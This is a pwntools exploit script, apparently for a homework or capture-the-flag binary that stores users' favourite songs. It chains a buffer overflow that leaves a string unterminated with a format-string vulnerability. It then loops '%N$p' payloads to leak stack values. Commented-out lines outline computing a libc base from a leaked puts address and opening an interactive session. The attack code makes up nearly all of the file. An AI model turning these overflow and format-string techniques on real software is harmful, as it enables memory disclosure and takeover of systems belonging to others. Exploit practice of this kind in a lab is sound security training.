from pwn import *

def select_option(option, wait=True):
    if wait:
        p.recvuntil(b"[4]: ")
    p.sendline(str(option).encode())

def register_user(username, password):
    select_option(0) 
    p.recvuntil(b"username: ")
    p.sendline(username)
    p.recvuntil(b"password: ")
    p.sendline(password)

def login(username, password):
    select_option(1)
    p.recvuntil(b"username: ")
    p.sendline(username)
    p.recvuntil(b"password: ")
    p.sendline(password)

def add_song(title, artist, album, broken = False):
    if not broken:
        select_option(2)
    p.recvuntil(b"title: ")
    p.sendline(title)
    p.recvuntil(b"from: ")
    p.sendline(artist)
    p.recvuntil(b"on: ")
    p.sendline(album)
    

def print_favorites():
    select_option(3)
    p.recvuntil(b"[4]: ")
    
def leak(payload):
    select_option(2, wait=False)
    add_song(b'|' + payload + b'|', b"artist", b"album", broken=True)
    select_option(3)
    res = p.recvuntil(b"[4]: ")
    start_index = res.find(b'|')
    end_index = res.find(b'|', start_index + 1)
    if start_index != -1 and end_index != -1:
        return res[start_index + 1:end_index]
    else:
        return None

exe = ELF(args.EXE or './homework')

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'info'
context.arch = 'amd64'
context.bits = 64
p = process([exe.path])
gdb.attach(p, '''break main''')

# run the exploit
# register and login
username = b"user1"
password = b"pass1"
register_user(username, password)
login(username, password)

# use buffer overflow in last element of struct (no "\0" character to end string -> read into next element)
payload = b"A" * 0x20
add_song(b"song", b"artist", payload)

# add invalid element -> read via buffer overflow

attack_payload = b"Exploit works: %x %x %x %x"
add_song(attack_payload, b"artist", b"album", broken=True)
print_favorites()

# craft attack vector
#fmt = FmtStr(execute_fmt=leak)
#print(fmt.offset)
# used to leak printf address: "Found format string offset: 341"

for i in range(1, 50):
    payload = f"%{i}$p".encode()
    res = leak(payload)
    print(f"Offset {i}: {res}")

# craft attack vector
#payload = fmtstr_payload(341, { }, write_size='byte')  # You only need to read, not write
#payload = f"%{341}$p".encode()
#res = leak(payload)
#print(res)


#libc = ELF("./libc.so.6")
#libc_base = leaked_puts - libc.symbols['puts']


#p.interactive()
